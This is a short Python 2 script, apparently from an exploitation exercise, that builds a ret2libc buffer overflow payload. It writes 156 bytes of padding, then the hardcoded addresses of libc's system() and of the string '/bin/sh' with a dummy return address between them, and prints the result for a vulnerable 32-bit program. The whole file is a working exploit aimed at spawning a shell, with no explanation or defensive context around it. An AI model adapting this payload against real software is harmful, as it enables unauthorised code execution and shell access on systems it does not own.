import struct

system_addr = struct.pack('I', 0xf7e6aed0)
bin_sh_addr = struct.pack('I', 0xf7f897ec)
return_dummy = "AAAA"

print "A" * 156 + system_addr + return_dummy + bin_sh_addr
